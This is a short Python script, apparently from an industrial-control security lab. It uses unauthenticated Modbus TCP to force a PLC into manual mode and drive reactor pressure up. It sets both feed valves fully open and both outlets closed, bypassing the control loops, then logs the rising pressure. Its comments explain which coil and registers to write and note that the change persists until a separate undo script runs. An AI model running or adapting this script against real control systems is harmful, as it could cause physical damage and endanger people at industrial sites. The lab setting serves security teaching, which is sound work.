#!/usr/bin/env python3
"""Attack 2: take manual control of the PLC and drive reactor pressure up.
Run in Kali:  python3 ~/lab/manual_takeover.py      (Ctrl+C stops watching; the attack stays on)
Undo with:    python3 ~/lab/back_to_auto.py

From the PLC program (Structured Text, file 326339.st):
  manual_mode     AT %QX0.0  -> coil 0             TRUE = ignore the control loops
  f1_manual_sp    AT %QW10   -> holding register 10
  f2_manual_sp    AT %QW11   -> holding register 11
  purge_manual_sp AT %QW12   -> holding register 12
  product_manual_sp AT %QW13 -> holding register 13
No authentication: anyone who can reach port 502 can write these.
"""
import time
from pymodbus.client import ModbusTcpClient

PLC = "192.168.95.2"
c = ModbusTcpClient(PLC, port=502, timeout=3)
c.connect()

# Both feeds fully open, both outlets closed: gas goes in, nothing comes out
c.write_registers(10, [65535, 65535, 0, 0], slave=1)
c.write_coil(0, True, slave=1)
print("PLC switched to MANUAL. Feeds 100%, purge 0%, product 0%.")
print("Look at the HMI now: does the operator get any warning?\n")

try:
    while True:
        ir = c.read_input_registers(100, count=10, slave=1).registers
        print(time.strftime("%H:%M:%S"), f"pressure {ir[8]*3200/65535:6.0f} kPa  (normal setpoint 2700)")
        time.sleep(5)
except KeyboardInterrupt:
    print("\nStopped watching. The PLC is STILL in manual. Run back_to_auto.py to undo.")
finally:
    c.close()
